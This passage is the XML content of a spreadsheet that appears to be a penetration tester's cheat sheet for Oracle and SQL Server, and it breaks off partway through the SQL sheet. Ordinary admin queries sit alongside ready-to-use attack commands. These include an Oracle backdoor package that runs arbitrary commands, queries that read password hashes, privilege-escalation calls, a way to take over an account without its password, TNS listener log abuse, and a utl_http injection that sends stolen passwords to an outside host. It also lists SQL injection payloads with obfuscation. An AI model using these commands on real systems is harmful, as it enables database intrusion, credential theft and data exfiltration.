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84.85pt"/>
    </style:style>
    <style:style style:name="co2" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="305.66pt"/>
    </style:style>
    <style:style style:name="co3" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="64.01pt"/>
    </style:style>
    <style:style style:name="co4" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="448.5pt"/>
    </style:style>
    <style:style style:name="co5" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="288.71pt"/>
    </style:style>
    <style:style style:name="ro1" style:family="table-row">
      <style:table-row-properties style:row-height="12.81pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro2" style:family="table-row">
      <style:table-row-properties style:row-height="19.39pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro3" style:family="table-row">
      <style:table-row-properties style:row-height="28.35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7.3pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro6" style:family="table-row">
      <style:table-row-properties style:row-height="55.19pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro7" style:family="table-row">
      <style:table-row-properties style:row-height="82.06pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro8" style:family="table-row">
      <style:table-row-properties style:row-height="26.79pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro9" style:family="table-row">
      <style:table-row-properties style:row-height="19.7pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro10" style:family="table-row">
      <style:table-row-properties style:row-height="19.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro11" style:family="table-row">
      <style:table-row-properties style:row-height="145.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro12" style:family="table-row">
      <style:table-row-properties style:row-height="28.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro13" style:family="table-row">
      <style:table-row-properties style:row-height="37.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro14" style:family="table-row">
      <style:table-row-properties style:row-height="64.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro15" style:family="table-row">
      <style:table-row-properties style:row-height="55.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro16" style:family="table-row">
      <style:table-row-properties style:row-height="308.24pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro17" style:family="table-row">
      <style:table-row-properties style:row-height="91.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro18" style:family="table-row">
      <style:table-row-properties style:row-height="82.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro19" style:family="table-row">
      <style:table-row-properties style:row-height="46.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro20" style:family="table-row">
      <style:table-row-properties style:row-height="109.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro21" style:family="table-row">
      <style:table-row-properties style:row-height="21.74pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro22" style:family="table-row">
      <style:table-row-properties style:row-height="217.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro23" style:family="table-row">
      <style:table-row-properties style:row-height="100.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro24" style:family="table-row">
      <style:table-row-properties style:row-height="73.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22pt" fo:language="en" fo:country="US" fo:font-style="normal" fo:text-shadow="none" style:text-underline-style="none" fo:font-weight="bold" style:text-underline-mode="continuous" style:text-overline-mode="continuous" style:text-line-through-mode="continuous" style:font-name-asian="DejaVu Sans" style:font-size-asian="22pt" style:language-asian="zh" style:country-asian="CN" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="22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size-complex="16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wrap-option="wrap"/>
    </style:style>
    <style:style style:name="ce7" style:family="table-cell" style:parent-style-name="Default">
      <style:table-cell-properties fo:wrap-option="wrap"/>
      <style:text-properties style:font-name="Liberation Serif"/>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Oracle" table:style-name="ta1">
        <table:table-column table:style-name="co1" table:default-cell-style-name="ce1"/>
        <table:table-column table:style-name="co2" table:default-cell-style-name="ce1"/>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>scheduled jobs</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT job from USER_JOBS;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>what does a job do</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT JOB, WHAT FROM USER_JOBS WHERE JOB = job_name;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>to log all sys and system commands; has to be set in the init.ora file</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>AUDIT_SYS_OPERATIONS=TRUE</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Audit option has to be set in init.ora file</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>AUDIT_TRAIL=DB (or FS to save on file system)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>check if audit_trail is enabled</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name, value from v$parameter where name like ‘%audit_trail%’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>list the audited table</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT o.name from sys.obj$ o, sys.tab$ t where t.audit$ like ‘%A%’ and o.obj#=t .obj#;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>list the audited table and the audited action (select/update/etc)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT  object_name, object_type, del, ins, sel, upd FROM dba_obj_audit_opts where del like ‘%A%’ or ins like ‘%A%’ or sel like ‘%A%’ or upd like ‘%A%’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>check if FGA is enabled</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * from DBA_AUDIT_POLICIES;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>check which objects are audited whith FGA</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT object_name, object_type, del, ins, sel, upd FROM dba_obj_audit_opts;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>table where audit log are stored</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>sys.FGA_LOG$</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>use this view to read FGA data</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>DBA_FGA_AUDIT_TRAIL</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>list all the stored procedure and their owner</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT OWNER, object_name, object_type FROM dba_obj_audit_opts where object_type=’PROCEDURE’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To list all the active trigger</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT owner,TRIGGER_NAME,TRIGGER_TYPE,status from dba_triggers;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To the UTL_FILE_DIR if present</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name, value from v$parameter where name = ‘utl_file_dir’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>change the value of utl_file_dir (db restart needed)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>alter system set utl_file_dir=’*’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To get users and passwords</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name, password FROM sys.user$ where type#=1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>if pfile is defined it’s possible to change the utl_file_dir in runtime without restarting the database</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>alter system set utl_file_dir=’*’ scope =spfile;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To copy a table into another</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>create table xxx.yyy as SELECT * from old.table;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Copy table from foreign host to here</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>COPY FROM user@tnsname CREATE tablename USING SELECT * FROM tablename;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>remove all tabulations in  query output</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>set head off set echo off set pagesize 0 set space 1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Set display rows</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SET PAGESIZE 66;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To give all java permission (read,write,execute) to a user</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>exec dbms_java.grant_permission(‘oracle_user’, ‘SYS:java.io.FilePermission’, ‘&lt;&lt;ALL FILES&gt;&gt;’, ‘execute’);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To extract a single choosed record from a table</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT TNAME from (SELECT TNAME,ROWNUM as rn from tab) where rn=’2′;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To list top n rows of a table in order</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM (SELECT * FROM t ORDER BY c) WHERE ROWNUM &lt;= n;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To view the oracle version</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT banner from v$version; #or SELECT banner || ‘-‘ || (SELECT banner from v$version where banner like ‘Oracle%’) from v$version where banner like ‘TNS%’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To show the source code of a package</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT text FROM user_source WHERE name = ‘SR_PKG’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To disable the uppersand (useful when creating a file on the disk)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>set define off</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To enable and define an escape char</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>set escape \</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To show the IP address of the db server</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT SYS_CONTEXT(‘USERENV’, ‘IP_ADDRESS’, 15) ipaddr from dual;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To show the HOSTNAME of the db server</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT SYS_CONTEXT(‘USERENV’, ‘HOST’, 15) ipaddr from dual;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To show user grants</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * from user_sys_privs;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>oracle simple backdoor (hey gippo, really thank you!)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CREATE OR REPLACE PACKAGE RAIST_PKG AS PROCEDURE exec_this_code(commandline IN VARCHAR2); END RAIST_PKG; / CREATE OR REPLACE PACKAGE BODY RAIST_PKG AS PROCEDURE exec_this_code(commandline IN VARCHAR2) IS BEGIN EXECUTE IMMEDIATE commandline; END; END RAIST_PKG; /</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To start a session as sysdba</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>sqlplus sys@sid as sysdba;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To start a sysdba session under Windows</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>sqlplus “/as sysdba”;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To start a session as sysdba before oracle 9i</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>$ svrmgrl svrmgrl&gt; connect internal</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To list all tables in current schema</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT table_name FROM user_tables;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To turn pause on</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SET PAUSE ON;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To show current database</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM global_name;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>to show who I am</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SHOW USER;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>to start SQLPLUS without login</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SQLPLUS /NOLOG</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To change a user’s password</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ALTER USER user IDENTIFIED BY password;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>to lock/unlock an account</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ALTER USER user ACCOUNT LOCK/UNLOCK;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To delete a user and all his objects</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>drop user username cascade;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To grant a priv to an user</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Grant “privilege” to “user”;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To grant privileges on a table</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>grant privileges on object to user;  (use public for any) eg. grant SELECT, insert, update, delete on suppliers to smithj;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To revoke privileges on a table</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>revoke privileges on object from user; eg. revoke delete on suppliers from anderson;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To grant privileges on a function or a procedure</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>grant execute on object to user; (use public for any) eg. grant execute on Find_Value to smithj;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To discover all the functions with public execute grant</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * from dba_tab_privs p, all_arguments a where grantee = ‘PUBLIC’ and privilege = ‘EXECUTE’ and p.table_name = a.package_name and p.owner = a.owner and a.position = 0 and a.in_out = ‘OUT’ order by p.owner, p.table_name, p.grantee</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To revoke privileges on a function or a procedure</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>revoke execute on object from user; eg. revoke execute on Find_Value from anderson;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To write a file abusing the tns listener log file using tnscmd.pl</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>perl ./tnscmd.pl -p1521 -h gollum –rawcmd “(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=)(HOST=)(USER=))(COMMAND=log_file)(ARGUMENTS=4)(SERVICE=LISTENER)(VERSION=1)(VALUE=/tmp/test)))” perl ./tnscmd.pl -h gollum –rawcmd “(CONNECT_DATA=((             + + ))” #respect the carriage return              ^^^^</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro7">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To open a http connection somewhere</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT utl.http_request(‘http://www.mioserver.pub’) from dual; #i know this trick in useful in at least two case: #case 1: modifying the glogin.sql file with the trick described above(with a #create user commandJ , you will have a line dropped in the log file of your #web server when a DBA log in. #case 2: it’s useful in sql injection to discover the IP address of the db server or to send data over http. SELECT utl_http.request(‘http://www.example.com’) FROM DUAL SELECT utl_http.request(‘http://www.example.com/?’ || (SELECT pass FROM members) ) FROM DUAL</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To escalate privileges from user: OUTLN BACKUP</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>exec ctxsys.driload.validate_stmt(‘grant dba to user’); exec dbms_repcat_admin.grant_admin_any_schema(‘user’)’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>to become a user without knowing his password</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p># first step, read his password hash SELECT password from sys.user$ where username=’user’; #second step, change his password Alter user username identified by new_password; #now you can log in with the user Sqlplus user/new_password@sid #When you are done you can set back the old user password update sys.user$ set password=’HASH’ where name=’DBA’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Functions useful for Blind SQL Injetion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>BEGIN DBMS_LOCK.SLEEP(5); END; – Sleep for 5 seconds CHR() – Convert to Char ASCII() – Convert to ASCII SUBSTR() – Substring BITAND() – Bit And operation LOWER() – Convert to LowerCase</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <table:table table:name="SQL" table:style-name="ta1">
        <table:table-column table:style-name="co4" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co5" table:default-cell-style-name="ce6"/>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>1 – Standard SQL injection (not blind)</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.1 – Information gathering</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get server version:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' OR 1 in (select @@version) –</text:p>
            <text:p>VERSION()</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get server name:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' OR 1 in (select @@servername) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get current username:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>' OR 1 in (select USER_NAME()) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get current database name:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' OR 1 in (select DB_NAME()) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>typical SQLi test</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 OR 1=1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>typical SQLi encapsulated</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1’ OR ‘1’=’1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Additional info with LIKE</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 or 1=1 AND user LIKE “%root%”</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Comment obfuscation</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 o/**/r 1=1 A/**/ND user L/**/IKE "%root%"</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro11">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check for privs</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T1">SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; </text:span></text:p>
            <text:p><text:span text:style-name="T1"/></text:p>
            <text:p><text:span text:style-name="T1">SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; </text:span></text:p>
            <text:p><text:span text:style-name="T1"/></text:p>
            <text:p><text:span text:style-name="T1">SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:style-name="ce4" table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.2 – Database structure</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>MSSQL is a very friendly database… you can get all db structures via normal select. Fist of all you can take the list of databases on the server.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>select * from master..sysdatabases</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Only the first result:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select name from master..sysdatabases) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get all records we need to implement something in sql like the limit keyword on mysql ($XX$ is the row number):</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
